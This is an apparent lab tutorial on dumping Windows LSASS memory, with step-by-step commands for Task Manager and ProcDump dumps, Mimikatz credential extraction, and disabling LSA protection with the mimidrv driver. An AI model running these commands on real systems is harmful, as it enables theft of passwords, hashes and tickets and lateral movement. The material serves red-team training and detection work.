# What is LSASS?

**Local Security Authority Subsystem Service (LSASS)** is a Windows process responsible for enforcing the operating system's security policy. It verifies logged-in accounts and manages credentials such as passwords, hashes, and Kerberos tickets. LSASS stores these credentials in memory, allowing users to access network resources (e.g., file shares, SharePoint sites) without re-entering credentials each time.

Because LSASS holds sensitive credential information, it is a prime target for red teamers. Attackers often attempt to dump LSASS memory to escalate privileges, steal data, or move laterally within a network. If you have administrator privileges, you can create a dump file (a snapshot of the process memory) using either the Windows GUI or the command prompt. This attack is tracked in the MITRE ATT&CK framework as **OS Credential Dumping: LSASS Memory (T1003)**.

---

## Dumping LSASS Memory

### Using the GUI (Task Manager)

1. Open **Task Manager**.
2. Go to the **Details** tab.
3. Find `lsass.exe`, right-click, and select **Create dump file**.

After dumping, a pop-up will show the file path. Copy the dump file and transfer it to your attack machine for offline analysis.

> **Note:** On some VMs, you may get an error until you adjust the registry value in the Protected LSASS section.

**Example: Copying the Dumped File**
```shell
copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
```

---

### Using Sysinternals ProcDump

If the GUI is unavailable, use **ProcDump** from the Sysinternals Suite (located at `C:\Tools\SysinternalsSuite`):

```shell
c:\> c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

Sample output:
```
[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
```

> **Note:** Dumping LSASS is a known attack technique and may be flagged by antivirus products.

---

## Extracting Credentials with Mimikatz

**Mimikatz** is a post-exploitation tool for extracting passwords, hashes, PINs, and Kerberos tickets from memory. It requires administrator or SYSTEM privileges.

1. Open a command prompt as administrator.
2. Navigate to the Mimikatz folder (`C:\Tools\Mimikatz`).
3. Run `mimikatz.exe`.

```shell
C:\Tools\Mimikatz> mimikatz.exe
```

Enable debug privileges:
```
mimikatz # privilege::debug
Privilege '20' OK
```

Dump cached credentials and hashes:
```
mimikatz # sekurlsa::logonpasswords
```

Sample output:
```
Authentication Id : 0 ; 515377 (00000000:0007dd31)
User Name         : Administrator
Domain            : THM
NTLM              : 98d3a787a80d08385cea7fb4aa2a4261
...
```

> **Note:** The user must have logged in for their credentials to be cached.

---

## Protected LSASS

Since 2012, Microsoft has implemented LSA protection to prevent credential extraction from LSASS. This is controlled by the `RunAsPPL` registry value at:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
```

If LSA protection is enabled, `sekurlsa::logonpasswords` will fail with an access denied error (`0x00000005`).

### Bypassing LSA Protection with Mimikatz Driver

Mimikatz provides a kernel driver (`mimidrv.sys`) to disable LSA protection:

1. Load the driver:
    ```
    mimikatz # !+
    ```
    Output:
    ```
    [*] 'mimidrv' service not present
    [+] 'mimidrv' service successfully registered
    [+] 'mimidrv' service started
    ```

    > If you get an `isFileExist` error, exit Mimikatz, navigate to `C:\Tools\Mimikatz\`, and try again.

2. Remove LSA protection:
    ```
    mimikatz # !processprotect /process:lsass.exe /remove
    ```

3. Retry dumping credentials:
    ```
    mimikatz # sekurlsa::logonpasswords
    ```

You should now be able to extract cached credentials from memory.
